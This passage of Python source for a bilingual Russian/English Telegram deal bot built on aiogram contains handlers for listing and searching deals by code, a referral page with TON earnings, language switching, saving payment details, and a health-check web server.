                InlineKeyboardButton(text="▶️", callback_data="deals_page_next")
            ])
    kb.append([InlineKeyboardButton(text="🔍 Поиск по коду", callback_data="search_deal_code")])
    kb.append([InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")])

    caption = (
        f"💼 <b>Мои сделки</b>\n\n"
        f"📊 Всего: <b>{total}</b>   ✅ Завершено: <b>{completed}</b>"
    )
    await delete_and_send_text(call, caption, InlineKeyboardMarkup(inline_keyboard=kb))

@dp.callback_query(F.data == "search_deal_code")
async def search_deal_start(call: CallbackQuery, state: FSMContext):
    await call.answer()
    await call.message.answer("Введите код сделки (например, #a1b2c3d4):")
    await state.set_state(SearchDeal.waiting_code)

@dp.message(SearchDeal.waiting_code)
async def search_deal_code_result(message: Message, state: FSMContext):
    code = message.text.strip().lstrip("#")
    deal_id = invite_codes.get(code)
    if not deal_id or deal_id not in deals:
        await message.answer("❌ Сделка не найдена.")
    else:
        d = deals[deal_id]
        await message.answer(
            f"🔍 Сделка #{deal_id}:\n"
            f"Продавец: {username_or_id(d['seller_id'])}\n"
            f"Покупатель: {username_or_id(d['buyer_id'])}\n"
            f"Сумма: {d['amount']} {emoji('ruble')}\n"
            f"Описание: {d.get('description', '—')}\n"
            f"Статус: {deal_status_text(d)}"
        )
    await state.clear()

@dp.callback_query(F.data.startswith("deal_info_"))
async def deal_info_handler(call: CallbackQuery):
    did = int(call.data.split("_")[2])
    d = deals.get(did)
    if not d:
        await call.answer("Сделка не найдена", show_alert=True)
        return
    txt = (
        f"<b>Сделка #{did}</b>\n"
        f"Продавец: {username_or_id(d['seller_id'])}\n"
        f"Покупатель: {username_or_id(d['buyer_id'])}\n"
        f"Сумма: {d['amount']} {emoji('ruble')}\n"
        f"Валюта: {d['currency']}\n"
        f"Описание: {d.get('description', '—')}\n"
        f"Статус: {deal_status_text(d)}\n"
        f"Код: <code>#{d.get('invite_code', '—')}</code>"
    )
    await call.message.answer(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад к списку", callback_data="my_deals")]
    ]))

# ===== РЕФЕРАЛЫ =====
@dp.callback_query(F.data == "referrals")
async def referrals_handler(call: CallbackQuery):
    uid = str(call.from_user.id); lang = get_lang(uid)
    refs = users.get(uid, {}).get("referrals", [])
    bot_username = (await bot.me()).username
    link = f"https://t.me/{bot_username}?start={uid}"
    earned_ton = users.get(uid, {}).get("ref_earned_ton", 0.0)
    txt = (
        f"{emoji('people')} Реферальная программа\n\n"
        f"<blockquote>🔗 Ваша ссылка:\n{link}\n\n"
        f"{emoji('people')} Рефералов: <b>{len(refs)}</b>\n"
        f"{emoji('balance_icon')} Заработано: <b>{earned_ton}</b> TON</blockquote>\n\n"
        f"{emoji('coin')} Бонус: 50% от комиссии с каждой сделки реферала!"
    ) if lang=="ru" else (
        f"{emoji('people')} Referral Program\n\n"
        f"<blockquote>🔗 Your link:\n{link}\n\n"
        f"{emoji('people')} Referrals: <b>{len(refs)}</b>\n"
        f"{emoji('balance_icon')} Earned: <b>{earned_ton}</b> TON</blockquote>\n\n"
        f"{emoji('coin')} Bonus: 50% commission from each referral deal!"
    )
    await delete_and_send_banner(call, txt, back_button(lang))

# ===== СМЕНА ЯЗЫКА =====
@dp.callback_query(F.data == "change_lang")
async def lang_cb(call: CallbackQuery):
    uid = str(call.from_user.id)
    cur_lang = users.setdefault(uid, {}).setdefault("lang", "ru")
    new_lang = "en" if cur_lang == "ru" else "ru"
    users[uid]["lang"] = new_lang
    save_data()
    await return_to_main(call, new_lang)

# ===== ВВОД РЕКВИЗИТОВ (общий обработчик) =====
@dp.message()
async def handle_rekv_input(message: Message):
    uid = str(message.from_user.id)
    current_state = await dp.storage.get_state(uid)
    if current_state is not None:
        return
    if uid in users and users[uid].get("pending_rekv"):
        key = users[uid]["pending_rekv"]
        users[uid][key] = message.text
        users[uid]["pending_rekv"] = None
        lang = get_lang(uid)
        await message.answer("✅ Сохранено!", reply_markup=main_menu(lang))
        save_data()

# ===== HTTP-СЕРВЕР =====
async def handle_health(request):
    return web.Response(text="OK", status=200)

async def run_web_server():
    app = web.Application()
    app.router.add_get("/", handle_health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logging.info(f"HTTP server started on port {PORT}")

async def main():
    load_data()
    logging.info("Запуск бота и HTTP-сервера...")
    try: await bot.session.close()
    except: pass
    await asyncio.sleep(1.5)
    await bot.delete_webhook(drop_pending_updates=True)
    await asyncio.sleep(0.5)
    await run_web_server()
    await dp.start_polling(
        bot,
        allowed_updates=dp.resolve_used_update_types(),
        polling_timeout=20,
        handle_as_tasks=True
    )

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s,f: sys.exit(0))
    signal.signal(signal.SIGTERM, lambda s,f: sys.exit(0))
    asyncio.run(main())
